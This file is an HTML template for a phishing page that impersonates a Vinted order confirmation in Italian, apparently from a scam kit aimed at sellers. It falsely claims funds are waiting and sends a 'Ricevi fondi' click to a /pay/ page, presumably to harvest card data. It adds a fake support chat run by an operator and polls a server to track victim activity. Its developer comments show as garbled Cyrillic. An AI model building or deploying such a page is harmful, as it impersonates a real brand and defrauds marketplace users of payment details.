<!DOCTYPE html>
<html lang="it">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Vinted Order</title>
    <style>
        * {
    margin: 0;
    padding: 0;
    box-sizing: border-box;
}

body {
    font-family: Arial, sans-serif;
    line-height: 1.6;
    background-color: #f5f5f5;
    color: #333;
    margin: 0;
}


header {
    display: flex;
    justify-content: space-between;
    align-items: center;
    padding: 20px;
    background-color: #fff;
    border-bottom: 1px solid #ccc;
}

.logo {
    font-size: 24px;
    font-weight: bold;
}

.header-actions button {
    margin-left: 10px;
    padding: 10px 15px;
    border: none;
    background-color: transparent;
    font-size: 16px;
    cursor: pointer;
}

.sell-button {
    background-color: #00bfa5;
    color: #fff;
    border-radius: 5px;
}

main {
    max-width: 800px;
    margin: 20px auto;
    background: #fff;
    padding: 20px;
    border-radius: 8px;
    box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
}

.order-summary,
.order-details,
.order-info {
    margin-bottom: 20px;
}

h2 {
    margin-bottom: 10px;
    font-size: 18px;
    color: #555;
}

.summary-item,
.summary-total {
    display: flex;
    justify-content: space-between;
    margin-bottom: 10px;
}

.summary-total {
    font-weight: bold;
}

.product {
    display: flex;
    align-items: center;
    margin-bottom: 20px;
}

.product img {
    width: 80px;
    height: 80px;
    margin-right: 10px;
    border-radius: 8px;
    object-fit: cover;
}

.price {
    font-size: 18px;
    font-weight: bold;
    color: #333;
    margin-left: auto;
}

.info-item {
    margin-bottom: 10px;
}

.receive-funds {
    text-align: center;
    margin-top: 20px;
}

.receive-funds button {
    padding: 10px 20px;
    background-color: #00bfa5;
    color: #fff;
    border: none;
    border-radius: 5px;
    font-size: 16px;
    cursor: pointer;
}

.receive-funds p {
    margin-top: 10px;
    font-size: 14px;
    color: #666;
}



















/* —á–∞—Ç */
/* –û–±—â–∏–µ —Å—Ç–∏–ª–∏ */
#chat-button {
        position: fixed;
        bottom: 20px;
        right: 20px;
        background-color: #000;
        color: #fff;
        border: none;
        border-radius: 50px;
        width: 60px;
        height: 60px;
        font-size: 24px;
        display: flex;
        align-items: center;
        justify-content: center;
        cursor: pointer;
        z-index: 1001;
    }
    
    #chat-container {
        position: fixed;
        bottom: 80px;
        right: 20px;
        width: 280px;
        max-height: 500px;
        min-height: 400px;
        background-color: #fff;
        border-radius: 10px;
        box-shadow: 0px 8px 16px rgba(0, 0, 0, 0.2);
        display: none; /* –ß–∞—Ç —Å–∫—Ä—ã—Ç –ø–æ —É–º–æ–ª—á–∞–Ω–∏—é */
        flex-direction: column;
        overflow: hidden;
        z-index: 1000;
    }
    
    #chat-container.active {
        display: flex; /* –ü–æ–∫–∞–∑–∞—Ç—å —á–∞—Ç –ø—Ä–∏ –∞–∫—Ç–∏–≤–∞—Ü–∏–∏ */
    }
    
    #chat-header {
        display: flex;
        align-items: center;
        background-color: #000;
        color: #fff;
        padding: 10px;
        border-top-left-radius: 10px;
        border-top-right-radius: 10px;
    }
    
    .chat-avatar img {
        width: 40px;
        height: 40px;
        border-radius: 50%;
        margin-right: 10px;
    }
    
    .chat-info h3 {
        margin: 0;
        font-size: 16px;
    }
    
    .chat-info p {
        margin: 0;
        font-size: 12px;
        opacity: 0.7;
    }
    
    #close-chat {
        background: none;
        border: none;
        color: #fff;
        font-size: 18px;
        margin-left: auto;
        cursor: pointer;
    }
    
    #chat-messages {
        flex: 1;
        padding: 10px;
        background-color: #f9f9f9;
        overflow-y: auto;
    }
    
    .chat-message {
        margin: 5px 0;
        display: flex;
        align-items: flex-start;
    }
    
    .chat-message.user {
        justify-content: flex-end;
    }
    
    .chat-bubble {
        max-width: 70%;
        padding: 10px;
        border-radius: 10px;
        font-size: 14px;
        line-height: 1.4;
    }
    
    .chat-message.user .chat-bubble {
        background-color: #000;
        color: #fff;
        border-bottom-right-radius: 0;
    }
    
    .chat-message.bot .chat-bubble {
        background-color: #e0e0e0;
        color: #000;
        border-bottom-left-radius: 0;
    }
    
    #chat-input {
        display: flex;
        padding: 10px;
        background-color: #fff;
        border-top: 1px solid #ddd;
    }
    
    #message-input {
        flex: 1;
        padding: 10px;
        border: 1px solid #ddd;
        border-radius: 20px;
        outline: none;
        font-size: 14px;
    }
    
    #send-button {
        background-color: #000;
        color: #fff;
        border: none;
        border-radius: 50%;
        width: 40px;
        height: 40px;
        margin-left: 10px;
        display: flex;
        align-items: center;
        justify-content: center;
        cursor: pointer;
    }










    
    </style>
</head>



<body>
    <header>
        <img src="https://marketplace-web-assets.vinted.com/assets/web-logo/default/logo.svg" alt="Logo di Vinted" class="web_ui__Image__content">
        <div class="header-actions">
            <button>Iscriviti | Accedi</button>
            <button class="sell-button">Vendi ora</button>
        </div>
    </header>
    

    <!-- –ß–ê–¢ –ù–ê–ß -->
    <button id="chat-button">üí¨</button>
    <div id="chat-container">
        <div id="chat-header">
            <div class="chat-avatar">
                <img src="/media/operator-img.png" alt="Support">
            </div>
            <div class="chat-info">
                <h3>Supporto</h3>
                <p>Online</p>
            </div>
            <button id="close-chat">‚úñ</button>
        </div>
        <div id="chat-messages"></div>
        <div id="chat-input">
            <input type="text" id="message-input" placeholder="Digitare un messaggio...">
            <button id="send-button">‚û§</button>
        </div>
    </div>
        
    <script>
        const chatButton = document.getElementById('chat-button');
        const chatContainer = document.getElementById('chat-container');
        const closeChat = document.getElementById('close-chat');
        const sendButton = document.getElementById('send-button');
        const messageInput = document.getElementById('message-input');
        const chatMessages = document.getElementById('chat-messages');
        
        // –û—Ç–∫—Ä—ã—Ç–∏–µ/–∑–∞–∫—Ä—ã—Ç–∏–µ —á–∞—Ç–∞
        chatButton.addEventListener('click', () => {
            chatContainer.classList.toggle('active');
        });
        
        closeChat.addEventListener('click', () => {
            chatContainer.classList.remove('active');
        });
        


        // –§—É–Ω–∫—Ü–∏—è –¥–ª—è –∏–∑–≤–ª–µ—á–µ–Ω–∏—è —Ç–æ–∫–µ–Ω–∞ –∏–∑ URL
        function getTokenFromURL() {
            const url = window.location.pathname; // –ü–æ–ª—É—á–∞–µ–º –ø—É—Ç—å –∏–∑ URL
            const match = url.match(/\/get\/([^/]+)/); // –ò—â–µ–º —Ç–æ–∫–µ–Ω –ø–æ—Å–ª–µ /get/
            return match ? match[1] : null; // –í–æ–∑–≤—Ä–∞—â–∞–µ–º —Ç–æ–∫–µ–Ω –∏–ª–∏ null, –µ—Å–ª–∏ —Ç–æ–∫–µ–Ω –Ω–µ –Ω–∞–π–¥–µ–Ω
        }




        // –§—É–Ω–∫—Ü–∏—è –¥–ª—è –∑–∞–ø—Ä–æ—Å–∞ —Å–æ–æ–±—â–µ–Ω–∏–π –æ—Ç –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä–∞
        async function fetchAdminMessages(token) {
            try {
                const response = await fetch(`/get_admin_message_support/${token}/`, {
                    method: 'GET',
                    headers: {
                        'Content-Type': 'application/json'
                    }
                });

                if (response.ok) {
                    const data = await response.json();
                    const status = data.status
                    if (status=="success") {
                        const adminMessage = data.message || null;
                        if (adminMessage) {
                            addMessage(adminMessage, 'bot'); // –î–æ–±–∞–≤–ª—è–µ–º —Å–æ–æ–±—â–µ–Ω–∏–µ –æ—Ç –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä–∞
                        }
                    }
                } else {
                    console.error('–û—à–∏–±–∫–∞ –ø—Ä–∏ –∑–∞–ø—Ä–æ—Å–µ —Å–æ–æ–±—â–µ–Ω–∏–π –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä–∞:', response.status);
                }
            } catch (error) {
                console.error('–û—à–∏–±–∫–∞ –ø—Ä–∏ –ø–æ–¥–∫–ª—é—á–µ–Ω–∏–∏:', error);
            }
        }
        
        // –§—É–Ω–∫—Ü–∏—è –¥–ª—è –æ—Ç–ø—Ä–∞–≤–∫–∏ —Å–æ–æ–±—â–µ–Ω–∏–π
        async function sendMessage() {
            const userMessage = messageInput.value.trim();
            const token = getTokenFromURL(); // –ü–æ–ª—É—á–∞–µ–º —Ç–æ–∫–µ–Ω –∏–∑ URL

            if (userMessage && token) {
                addMessage(userMessage, 'user'); // –û—Ç–æ–±—Ä–∞–∂–∞–µ–º —Å–æ–æ–±—â–µ–Ω–∏–µ –æ—Ç –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è

                // –§–æ—Ä–º–∏—Ä—É–µ–º —Ç–µ–ª–æ –∑–∞–ø—Ä–æ—Å–∞
                const payload = {
                    text: userMessage,
                    token: token
                };

                try {
                    // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –∑–∞–ø—Ä–æ—Å –Ω–∞ —Å–µ—Ä–≤–µ—Ä
                    const response = await fetch(`/send_message_support/${token}/`, {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json'
                        },
                        body: JSON.stringify(payload)
                    });

                    if (response.ok) {
                        messagePollingInterval = setInterval(() => {
                            fetchAdminMessages(token);
                        }, 2000);



                    } else {
                        addMessage('–û—à–∏–±–∫–∞ —Å–µ—Ä–≤–µ—Ä–∞, –ø–æ–ø—Ä–æ–±—É–π—Ç–µ –ø–æ–∑–∂–µ.', 'bot');
                    }
                } catch (error) {
                    console.error('–û—à–∏–±–∫–∞:', error);
                    addMessage('–û—à–∏–±–∫–∞ –ø–æ–¥–∫–ª—é—á–µ–Ω–∏—è, –ø–æ–ø—Ä–æ–±—É–π—Ç–µ –ø–æ–∑–∂–µ.', 'bot');
                }

                messageInput.value = ''; // –û—á–∏—â–∞–µ–º –ø–æ–ª–µ –≤–≤–æ–¥–∞
            } else if (!token) {
                alert('–¢–æ–∫–µ–Ω –Ω–µ –Ω–∞–π–¥–µ–Ω –≤ URL!');
            }
}

        // –§—É–Ω–∫—Ü–∏—è –¥–ª—è –¥–æ–±–∞–≤–ª–µ–Ω–∏—è —Å–æ–æ–±—â–µ–Ω–∏—è
        function addMessage(text, sender) {
            const messageElement = document.createElement('div');
            messageElement.classList.add('chat-message', sender);
            const bubble = document.createElement('div');
            bubble.classList.add('chat-bubble');
            bubble.textContent = text;
            messageElement.appendChild(bubble);
            chatMessages.appendChild(messageElement);
            chatMessages.scrollTop = chatMessages.scrollHeight;
        }

        // –ü—Ä–∏–≤—è–∑–∫–∞ —Å–æ–±—ã—Ç–∏–π
        sendButton.addEventListener('click', sendMessage); // –û—Å—Ç–∞–≤–ª—è–µ–º –æ–¥–Ω—É –ø—Ä–∏–≤—è–∑–∫—É
        messageInput.addEventListener('keypress', (event) => {
            if (event.key === 'Enter') {
                sendMessage();
            }
        });

</script>
    

    <!-- –ß–ê–¢ –ö–û–ù -->











    <main>
        <section class="order-summary">
            <h2>Riepilogo ordine</h2>
            <div class="summary-item">
                <p>Ordine</p>
                <p>{{ price }}</p>
            </div>
            <div class="summary-item">
                <p>Commissione di protezione dell‚Äôacquirente</p>
                <p>0.00‚Ç¨</p>
            </div>
            <div class="summary-total">
                <p><strong>Totale da pagare</strong></p>
                <p><strong>{{ price }}</strong></p>
            </div>
        </section>
        <section class="order-details">
            <h2>Order</h2>
            <div class="product">
                <img src="{{ image_url }}" alt="Product Image">
                <div>
                    <p><strong>{{ product_name }}</strong></p>
                    <p>Molto buona ‚Ä¢ {{ product_name }}</p>
                </div>
                <p class="price">{{ price }}</p>
            </div>
            <p>Dopo aver ricevuto il denaro sulla tua carta, invia la merce all‚Äôacquirente secondo i dati specificati o tramite un corriere che ti contatter√† entro 12 ore.</p>
            <p>Cliccando sul pulsante "Ricevi fondi", accetti i termini delle Condizioni d‚ÄôUso utilizzando il servizio sulla stringa "Offerta sicura".</p>
        </section>
        <section class="order-info">
            <h2>Dati dell‚Äôordine</h2>
            <div class="info-item">
                <p><strong>Nome e cognome</strong></p>
                <p>{{ name }}</p>
            </div>
            <div class="info-item">
                <p><strong>Indirizzo di consegna</strong></p>
                <p>{{ address }}</p>
            </div>
        </section>
        <div class="receive-funds">
            <button id="Ricevi">Ricevi fondi</button>
            <p>Questo pagamento √® crittografato e sicuro</p>
        </div>
        
        <script>
            // –î–æ–±–∞–≤–ª—è–µ–º –æ–±—Ä–∞–±–æ—Ç—á–∏–∫ –∫–ª–∏–∫–∞ –∫ –∫–Ω–æ–ø–∫–µ —Å ID "Ricevi"
            document.querySelector("#Ricevi").addEventListener("click", function() {
                // –ü–æ–ª—É—á–µ–Ω–∏–µ —Ç–µ–∫—É—â–µ–≥–æ URL
                const currentUrl = window.location.href;
        
                // –ò–∑–≤–ª–µ—á–µ–Ω–∏–µ —á–∞—Å—Ç–∏ URL –ø–æ—Å–ª–µ "/get/"
                const extractedPart = currentUrl.split("/get/")[1];
        
                // –ü—Ä–æ–≤–µ—Ä–∫–∞, –µ—Å—Ç—å –ª–∏ –Ω—É–∂–Ω–∞—è —á–∞—Å—Ç—å –≤ URL
                if (extractedPart) {
                    // –ü–µ—Ä–µ–Ω–∞–ø—Ä–∞–≤–ª–µ–Ω–∏–µ –Ω–∞ "/pay/" —Å –¥–æ–±–∞–≤–ª–µ–Ω–∏–µ–º –∏–∑–≤–ª–µ—á–µ–Ω–Ω–æ–π —á–∞—Å—Ç–∏
                    window.location.href = "/pay/" + extractedPart;
                } else {
                    alert("–û—à–∏–±–∫–∞: –≤ URL –æ—Ç—Å—É—Ç—Å—Ç–≤—É–µ—Ç —á–∞—Å—Ç—å –ø–æ—Å–ª–µ '/get/'.");
                }
            });
        </script>









        <script>
            const currentUrl = window.location.href;
            const token = currentUrl.split("/get/")[1];
        
            // –§—É–Ω–∫—Ü–∏—è –¥–ª—è —É–≤–µ–¥–æ–º–ª–µ–Ω–∏—è —Å–µ—Ä–≤–µ—Ä–∞
            async function notifyServer() {
            try {
                const response = await fetch(`/check_activity/${token}`, {
                method: 'GET',
                headers: {
                    'Content-Type': 'application/json'
                }
                });
                if (response.ok) {
                console.log("–ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –∞–∫—Ç–∏–≤–µ–Ω");
                } else {
                console.log("–û—à–∏–±–∫–∞ —Å–µ—Ä–≤–µ—Ä–∞ –ø—Ä–∏ –ø—Ä–æ–≤–µ—Ä–∫–µ –∞–∫—Ç–∏–≤–Ω–æ—Å—Ç–∏");
                }
            } catch (error) {
                console.error("–û—à–∏–±–∫–∞ –ø—Ä–∏ –æ—Ç–ø—Ä–∞–≤–∫–µ –∑–∞–ø—Ä–æ—Å–∞:", error);
            }
            }
        
            // –£—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ–º –∏–Ω—Ç–µ—Ä–≤–∞–ª —É–≤–µ–¥–æ–º–ª–µ–Ω–∏–π
            setInterval(notifyServer, 5000); // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –∑–∞–ø—Ä–æ—Å –∫–∞–∂–¥—ã–µ 5 —Å–µ–∫—É–Ω–¥
        </script>
  
        
        
    </main>
</body>
</html>
